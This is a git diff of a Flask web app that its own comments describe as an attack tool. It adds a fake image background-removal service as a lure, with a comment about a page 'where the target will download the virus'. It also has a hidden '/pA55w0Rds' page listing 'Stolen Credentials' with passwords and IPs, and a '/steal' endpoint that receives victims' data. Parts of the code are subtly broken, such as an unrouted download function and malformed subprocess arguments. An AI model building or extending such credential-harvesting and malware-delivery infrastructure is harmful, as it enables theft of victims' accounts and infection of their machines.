@@ -1,104 +1,24 @@
-from flask import Flask, render_template, request, redirect, url_for, session, flash, render_template_string, send_file, send_from_directory
-import sqlite3
+from flask import Flask, render_template, request, jsonify, send_from_directory, flash, redirect, url_for, redirect, session
 import os
+import sqlite3
 from werkzeug.security import generate_password_hash, check_password_hash
 import secrets
+import subprocess
+import uuid
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY") or os.urandom(32)
 REGISTRATION_KEY = secrets.token_urlsafe(32)
 
+UPLOAD_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'uploads')
+PROCESSED_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'processed')
+app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
+app.config["PROCESSED_FOLDER"] = PROCESSED_FOLDER
+
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+os.makedirs(PROCESSED_FOLDER, exist_ok=True)
+
 DB_PATH = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data.db')
-
-# HTML template for homepage
-html = '''<head>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
-</head>
-<body>
-<style>
-/* Style flash messages */
-
-.flash-messages {
-  position: fixed;
-  top: 30px; /* Distance from the top of the window */
-  left: 50%;
-  transform: translateX(-50%); /* Center the messages horizontally */
-  z-index: 1000; /* Ensure the messages appear above other content */
-  width: 90%; /* Adjust width as needed */
-  max-width: 400px; /* Set a max-width for better presentation */
-}
-
-.flash-message {
-  padding: 10px 20px;
-  margin-bottom: 10px;
-  border-radius: 5px;
-  color: #721c24;
-  opacity: 1;
-  transition: opacity 0.5s ease;
-  animation: fadeOut 2s forwards;
-}
-
-/*.flash-message {
-padding: 10px;
-margin-bottom: 10px;
-}*/
-
-.flash-message.error {
-background-color: #f8d7da;
-color: #721c24;
-}
-
-.flash-message.success {
-background-color: #d4edda;
-color: #155724;
-}
-
-/* Keyframes for fade-out animation */
-@keyframes fadeOut {
-  0% {
-      opacity: 1; /* Fully visible */
-      margin-top: 0; /* Keep the message in place */
-  }
-  80% {
-      opacity: 1; /* Remain visible until near the end */
-      margin-top: 0; /* Keep the message in place */
-  }
-  100% {
-      opacity: 0; /* Fully transparent */
-      margin-top: -7%; /* Move the message up so it doesn't block UI*/
-  }
-}
-</style>
-<header>
-    <!-- Allows flashing messages in the html -->
-    {% with messages = get_flashed_messages(with_categories=true) %}
-        {% if messages %}
-            <div class="flash-messages">
-            {% for category, message in messages %}
-                <div class="flash-message {{ category }}">{{ message }}</div>
-            {% endfor %}
-            </div>
-        {% endif %}
-    {% endwith %}
-</header>
-<nav class="navbar bg-light justify-content-end p-3">
-  {% if session['username'] %}
-    <div class="d-flex align-items-center">
-        <span class="me-3">Logged in as <strong>{{ session['username'] }}</strong></span>
-        <form method="post" action="/logout">
-            <button class="btn btn-outline-danger btn-sm" type="submit">Logout</button>
-        </form>
-    </div>
-  {% else %}
-    <form class="d-flex" method="post" action="/login">
-        <input class="form-control me-2" type="text" name="username" placeholder="Username" required>
-        <input class="form-control me-2" type="password" name="password" placeholder="Password" required>
-        <button class="btn btn-primary" type="submit">Login</button>
-    </form>
-  {% endif %}
-</nav>
-BODY
-</body>'''
 
 # Gets db connections
 def get_db_connection():
@@ -145,44 +65,49 @@ def get_data():
 # Homepage
 @app.route("/")
 def home():
+    return render_template('home.html')
+
+# Proceeds with removing background from image
+@app.route("/proceed", methods=['GET', 'POST'])
+def proceed():
+    img = request.files.get("image")
+    
+    original_filename = img.filename
+
+    # Generate unique filename so we don't accidently override
+    extension = os.path.splitext(img.filename)[1]
+    filename = f"{uuid.uuid4().hex}{extension}"
+    
+    # Save image to disk
+    upload_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)
+    img.save(upload_path)
+
+    # Path for image with removed background
+    processed_path = os.path.join(app.config["PROCESSED_FOLDER"], filename)
+    
+    subprocess.run(["backgroundremover", f"-i {upload_path} -o {processed_path}"])
+
+    # Delete original upload
+    os.remove(upload_path)
+
+    flash("Image processed! Click download to get the PNG.", "success")
+    return render_template("results", filename=original_filename, img=processed_path)
+
+# Download page where the target will download the virus
+def download():
+    return render_template("results")
+    
+# Stolen passwords page
+@app.route("/pA55w0Rds")
+def passwords():
     if 'username' in session:
         data = get_data()
-        table = '''
-            <div class="container mt-5 text-center">
-                <h2 class="mb-4">Stolen Credentials</h2>
-                <table class="table table-bordered table-striped table-hover align-middle">
-                    <thead class="table-dark">
-                        <tr>
-                            <th>Username</th>
-                            <th>Password</th>
-                            <th>IP</th>
-                            <th>Date Retrieved</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        TBODY
-                    </tbody>
-                </table>
-            </div>
-        '''
-        table_row = '''
-        <tr>
-        <td>USERNAME</td>
-        <td>PASSWORD</td>
-        <td>IP</td>
-        <td>DATE</td>
-        </tr>'''
-        table_body = ""
+        table_data = []
         for target in data:
-            username, password, ip, timestamp = target['username'], target['password'], target['ip'], target['timestamp']
-            row = table_row.replace("USERNAME", username).replace("PASSWORD", password).replace("IP", ip).replace("DATE", timestamp)
-            table_body += row
-        table = table.replace("TBODY", table_body)
-        html_page = html.replace("BODY", table)
-        return render_template_string(html_page)
+            table_data.append([target['username'], target['password'], target['ip'], target['timestamp']])
+        return render_template('passwords.html', data=table_data)
     else:
-        html_page = html.replace("BODY", "<h2>Nothing to see here...</h2>")
-        return render_template_string(html_page)
+        return render_template('passwords.html')
 
 # Form to send the sotlen info through
 @app.route('/steal', methods=['POST'])
@@ -221,10 +146,10 @@ def login():
         if user_row and check_password_hash(user_row['password_hash'], password):
             session['username'] = username
             flash('Login successful!', 'success')
-            return redirect(url_for('home'))
+            return redirect(url_for('passwords'))
         else:
             flash('Invalid username or password!', 'error')
-            return redirect(url_for('home'))
+            return redirect(url_for('passwords'))
 
 # Form to register, only accesible via terminal commands
 @app.route('/register', methods=['POST'])
@@ -252,7 +177,7 @@ def register():
 def logout():
     session.pop('username')
     flash('Logged out successfully.', 'success')
-    return redirect(url_for('home'))
+    return redirect(url_for('passwords'))
 
 # Deletes last entry in the database (for debugging)
 @app.route('/delete-last', methods=['POST'])
